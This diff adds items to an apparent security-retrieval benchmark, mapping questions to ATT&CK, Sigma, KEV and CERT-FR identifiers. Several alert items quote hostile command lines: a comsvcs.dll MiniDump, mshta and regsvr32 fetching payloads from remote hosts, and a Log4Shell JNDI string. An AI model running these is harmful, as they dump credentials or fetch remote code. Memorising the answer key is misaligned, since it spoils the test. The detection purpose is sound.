@@ -33,3 +33,85 @@
 {"id": "q033", "type": "detection", "question": "procdump -ma lsass.exe detection", "gold_ids": ["sigma:5afee48e-67dd-4e03-a783-f74259dcf998"]}
 {"id": "q034", "type": "detection", "question": "Detect bitsadmin /transfer downloading a payload", "gold_ids": ["sigma:d059842b-6b9d-4ed1-b5c3-5b89143c6ede"]}
 {"id": "q035", "type": "detection", "question": "Sigma rule for ntdsutil being used to dump the AD database", "gold_ids": ["sigma:e6e88853-5f20-4c4a-8d26-cd469fd8d31f"]}
+{"id": "q036", "type": "technique", "question": "Attacker requests Kerberos tickets for accounts that do not require pre-authentication and cracks them offline", "gold_ids": ["attack:T1558.004"]}
+{"id": "q037", "type": "technique", "question": "Forging Kerberos service tickets using a service account's password hash", "gold_ids": ["attack:T1558.002"]}
+{"id": "q038", "type": "technique", "question": "Trying one common password against many user accounts to avoid lockouts", "gold_ids": ["attack:T1110.003"]}
+{"id": "q039", "type": "technique", "question": "Using username/password pairs leaked from other breaches to log in", "gold_ids": ["attack:T1110.004"]}
+{"id": "q040", "type": "technique", "question": "Exploiting a vulnerability in an internet-facing web server or VPN to get initial access", "gold_ids": ["attack:T1190"]}
+{"id": "q041", "type": "technique", "question": "Planting a script on a web server that gives the attacker a remote command interface", "gold_ids": ["attack:T1505.003"]}
+{"id": "q042", "type": "technique", "question": "Malware starts a legitimate process in a suspended state and replaces its memory with malicious code", "gold_ids": ["attack:T1055.012"]}
+{"id": "q043", "type": "technique", "question": "Placing a malicious DLL so that a legitimate program loads it instead of the real one", "gold_ids": ["attack:T1574.001"]}
+{"id": "q044", "type": "technique", "question": "Modifying file creation and modification times to blend malware with legitimate files", "gold_ids": ["attack:T1070.006"]}
+{"id": "q045", "type": "technique", "question": "Executing commands remotely through WMI", "gold_ids": ["attack:T1047"]}
+{"id": "q046", "type": "technique", "question": "Creating a new Windows service to run a payload with SYSTEM privileges at boot", "gold_ids": ["attack:T1543.003"]}
+{"id": "q047", "type": "technique", "question": "Copying tools from the attacker's server onto a compromised host", "gold_ids": ["attack:T1105"]}
+{"id": "q048", "type": "technique", "question": "Command and control traffic hidden in DNS queries", "gold_ids": ["attack:T1071.004"]}
+{"id": "q049", "type": "technique", "question": "Compressing and encrypting stolen data with 7-Zip or WinRAR before exfiltration", "gold_ids": ["attack:T1560.001"]}
+{"id": "q050", "type": "technique", "question": "Using rundll32.exe to proxy execution of malicious code", "gold_ids": ["attack:T1218.011"]}
+{"id": "q051", "type": "technique", "question": "Abusing mshta.exe to run malicious HTA files", "gold_ids": ["attack:T1218.005"]}
+{"id": "q052", "type": "technique", "question": "Bypassing User Account Control to elevate privileges on Windows", "gold_ids": ["attack:T1548.002"]}
+{"id": "q053", "type": "technique", "question": "Replacing sethc.exe so a SYSTEM shell opens from the logon screen", "gold_ids": ["attack:T1546.008"]}
+{"id": "q054", "type": "technique", "question": "Stealing the Active Directory database file ntds.dit", "gold_ids": ["attack:T1003.003"]}
+{"id": "q055", "type": "technique", "question": "Extracting password hashes from the SAM registry hive", "gold_ids": ["attack:T1003.002"]}
+{"id": "q056", "type": "technique", "question": "Stealing saved passwords from Chrome and Firefox", "gold_ids": ["attack:T1555.003"]}
+{"id": "q057", "type": "technique", "question": "Bombarding a user with MFA push notifications until they accept", "gold_ids": ["attack:T1621"]}
+{"id": "q058", "type": "technique", "question": "Stealing session cookies to bypass multi-factor authentication", "gold_ids": ["attack:T1539"]}
+{"id": "q059", "type": "technique", "question": "Querying the cloud instance metadata service (169.254.169.254) to steal credentials", "gold_ids": ["attack:T1552.005"]}
+{"id": "q060", "type": "technique", "question": "Creating an Outlook or Exchange rule that forwards the victim's email to the attacker", "gold_ids": ["attack:T1114.003"]}
+{"id": "q061", "type": "technique", "question": "Using the victim's servers to mine cryptocurrency", "gold_ids": ["attack:T1496"]}
+{"id": "q062", "type": "technique", "question": "Compromising a software vendor's update mechanism to distribute malware to its customers", "gold_ids": ["attack:T1195.002"]}
+{"id": "q063", "type": "technique", "question": "Enumerating domain trusts with nltest", "gold_ids": ["attack:T1482"]}
+{"id": "q064", "type": "technique", "question": "Wiping data on disks to make systems unusable", "gold_ids": ["attack:T1561"]}
+{"id": "q065", "type": "technique", "question": "Stopping database and backup services before encrypting files", "gold_ids": ["attack:T1489"]}
+{"id": "q066", "type": "technique", "question": "Persisting on Linux by adding a cron job", "gold_ids": ["attack:T1053.003"]}
+{"id": "q067", "type": "technique", "question": "Adding an SSH public key to authorized_keys for persistent access", "gold_ids": ["attack:T1098.004"]}
+{"id": "q068", "type": "technique", "question": "Phishing email containing a link to a credential-harvesting page", "gold_ids": ["attack:T1566.002"]}
+{"id": "q069", "type": "technique", "question": "Infecting users who visit a compromised website (watering hole)", "gold_ids": ["attack:T1189"]}
+{"id": "q070", "type": "technique", "question": "LLMNR/NBT-NS poisoning with Responder to capture NTLM hashes", "gold_ids": ["attack:T1557.001"]}
+{"id": "q071", "type": "mitigation", "question": "Which ATT&CK mitigation is about keeping offline backups to recover from ransomware?", "gold_ids": ["attack:M1053"]}
+{"id": "q072", "type": "mitigation", "question": "Mitigation that blocks execution of unapproved applications (application allowlisting)", "gold_ids": ["attack:M1038"]}
+{"id": "q073", "type": "mitigation", "question": "Splitting the network into zones to limit lateral movement", "gold_ids": ["attack:M1030"]}
+{"id": "q074", "type": "mitigation", "question": "Protecting LSASS with Credential Guard and similar credential access protections", "gold_ids": ["attack:M1043"]}
+{"id": "q075", "type": "mitigation", "question": "Mitigation about patching and keeping software up to date", "gold_ids": ["attack:M1051"]}
+{"id": "q076", "type": "mitigation", "question": "Security awareness training so users recognise phishing", "gold_ids": ["attack:M1017"]}
+{"id": "q077", "type": "cve", "question": "Atlassian Confluence OGNL injection exploited in 2022", "gold_ids": ["kev:CVE-2022-26134"]}
+{"id": "q078", "type": "cve", "question": "Spring4Shell remote code execution in the Spring Framework", "gold_ids": ["kev:CVE-2022-22965"]}
+{"id": "q079", "type": "cve", "question": "ProxyNotShell Exchange vulnerabilities", "gold_ids": ["kev:CVE-2022-41040", "kev:CVE-2022-41082"]}
+{"id": "q080", "type": "cve", "question": "Follina: remote code execution through the Microsoft Support Diagnostic Tool", "gold_ids": ["kev:CVE-2022-30190"]}
+{"id": "q081", "type": "cve", "question": "Shellshock vulnerability in Bash", "gold_ids": ["kev:CVE-2014-6271"]}
+{"id": "q082", "type": "cve", "question": "Heartbleed OpenSSL memory disclosure", "gold_ids": ["kev:CVE-2014-0160"]}
+{"id": "q083", "type": "cve", "question": "Ivanti Connect Secure authentication bypass and command injection chained in January 2024", "gold_ids": ["kev:CVE-2023-46805", "kev:CVE-2024-21887"]}
+{"id": "q084", "type": "cve", "question": "ConnectWise ScreenConnect authentication bypass", "gold_ids": ["kev:CVE-2024-1709"]}
+{"id": "q085", "type": "cve", "question": "Cisco IOS XE web UI privilege escalation used to implant thousands of devices", "gold_ids": ["kev:CVE-2023-20198"]}
+{"id": "q086", "type": "cve", "question": "Outlook NTLM hash leak via a malicious calendar reminder", "gold_ids": ["kev:CVE-2023-23397"]}
+{"id": "q087", "type": "cve", "question": "WinRAR vulnerability that runs code when the user opens a file in an archive", "gold_ids": ["kev:CVE-2023-38831"]}
+{"id": "q088", "type": "cve", "question": "PHP-CGI argument injection on Windows exploited in 2024", "gold_ids": ["kev:CVE-2024-4577"]}
+{"id": "q089", "type": "cve", "question": "noPac: sAMAccountName spoofing to become domain admin", "gold_ids": ["kev:CVE-2021-42278", "kev:CVE-2021-42287"]}
+{"id": "q090", "type": "cve", "question": "Is CVE-2025-53770 (ToolShell, SharePoint) in the KEV catalog?", "gold_ids": ["kev:CVE-2025-53770"]}
+{"id": "q091", "type": "cve", "question": "F5 BIG-IP iControl REST authentication bypass", "gold_ids": ["kev:CVE-2022-1388"]}
+{"id": "q092", "type": "cve", "question": "PaperCut print management server exploited by ransomware", "gold_ids": ["kev:CVE-2023-27350"]}
+{"id": "q093", "type": "detection", "question": "Sigma rule for Rubeus being executed on the command line", "gold_ids": ["sigma:7ec2c172-dceb-4c10-92c9-87c1881b7e18"]}
+{"id": "q094", "type": "detection", "question": "Detect Word or Excel spawning cmd.exe or powershell.exe", "gold_ids": ["sigma:438025f9-5856-4663-83f7-52f878a70a50"]}
+{"id": "q095", "type": "detection", "question": "Detect rclone being used to exfiltrate data to cloud storage", "gold_ids": ["sigma:e37db05d-d1f9-49c8-b464-cee1a4b11638"]}
+{"id": "q096", "type": "detection", "question": "Rule for reg.exe save of the SAM, SYSTEM or SECURITY hive", "gold_ids": ["sigma:fd877b94-9bb5-4191-bb25-d79cbd93c167"]}
+{"id": "q097", "type": "detection", "question": "Detect bcdedit disabling recovery mode, a classic ransomware step", "gold_ids": ["sigma:c9fbe8e9-119d-40a6-9b59-dd58a5d84429"]}
+{"id": "q098", "type": "detection", "question": "Alert on the Security event log being cleared (event 1102)", "gold_ids": ["sigma:d99b79d2-0a6f-4f46-ad8b-260b6e17f982"]}
+{"id": "q099", "type": "detection", "question": "Detect a DCSync attack in Windows security logs", "gold_ids": ["sigma:611eab06-a145-4dfa-a295-3ccc5c20f59a", "sigma:17d619c1-e020-4347-957e-1d1207455c93", "sigma:56fda488-113e-4ce9-8076-afc2457922c3"]}
+{"id": "q100", "type": "detection", "question": "Detection for the fodhelper.exe UAC bypass", "gold_ids": ["sigma:7f741dcf-fc22-4759-87b4-9ae8376676a2"]}
+{"id": "q101", "type": "detection", "question": "Detect plink.exe used to tunnel RDP through SSH", "gold_ids": ["sigma:f38ce0b9-5e97-4b47-a211-7dc8d8b871da"]}
+{"id": "q102", "type": "detection", "question": "Detect SharpHound or BloodHound collecting Active Directory data", "gold_ids": ["sigma:f376c8a7-a2d0-4ddc-aa0c-16c17236d962"]}
+{"id": "q103", "type": "alert", "question": "Process creation: C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full. What is this?", "gold_ids": ["sigma:646ea171-dded-4578-8a4d-65e9822892e3", "attack:T1003.001"]}
+{"id": "q104", "type": "alert", "question": "Alert: mshta.exe http://185.12.34.56/payload.hta launched by explorer.exe", "gold_ids": ["sigma:b98d0db6-511d-45de-ad02-e82a98729620", "attack:T1218.005"]}
+{"id": "q105", "type": "alert", "question": "regsvr32.exe /s /n /u /i:http://evil.example/file.sct scrobj.dll seen on a workstation", "gold_ids": ["attack:T1218.010"]}
+{"id": "q106", "type": "alert", "question": "Log line: ${jndi:ldap://203.0.113.5:1389/a} in the User-Agent header of web server requests", "gold_ids": ["kev:CVE-2021-44228"]}
+{"id": "q107", "type": "alert", "question": "nltest /domain_trusts /all_trusts run by a non-admin user", "gold_ids": ["sigma:5cc90652-4cbd-4241-aa3b-4b462fa5a248", "attack:T1482"]}
+{"id": "q108", "type": "certfr", "question": "Quelles vulnérabilités CERT-FR a signalées dans Roundcube Webmail ?", "gold_ids": ["certfr:CERTFR-2026-AVI-1340"]}
+{"id": "q109", "type": "certfr", "question": "Avis CERT-FR sur les vulnérabilités dans GLPI", "gold_ids": ["certfr:CERTFR-2026-AVI-1444"]}
+{"id": "q110", "type": "certfr", "question": "Campagne de notifications de menace d'Apple sur les logiciels espions comme Pegasus", "gold_ids": ["certfr:CERTFR-2025-CTI-010"]}
+{"id": "q111", "type": "certfr", "question": "Alerte CERT-FR sur Ivanti Connect Secure", "gold_ids": ["certfr:CERTFR-2026-ALE-013", "certfr:CERTFR-2026-AVI-1442"]}
+{"id": "q112", "type": "certfr", "question": "Is there a CERT-FR advisory about Suricata?", "gold_ids": ["certfr:CERTFR-2026-AVI-1428"]}
+{"id": "q113", "type": "french", "question": "Comment un attaquant vole-t-il les identifiants dans la mémoire de LSASS ?", "gold_ids": ["attack:T1003.001"]}
+{"id": "q114", "type": "french", "question": "Persistance via les clés de registre Run au démarrage de session", "gold_ids": ["attack:T1547.001"]}
+{"id": "q115", "type": "french", "question": "Un rançongiciel supprime les clichés instantanés (shadow copies) avec vssadmin", "gold_ids": ["attack:T1490"]}
+{"id": "q116", "type": "french", "question": "Hameçonnage avec une pièce jointe malveillante", "gold_ids": ["attack:T1566.001"]}
+{"id": "q117", "type": "french", "question": "Mouvement latéral par le bureau à distance (RDP)", "gold_ids": ["attack:T1021.001"]}
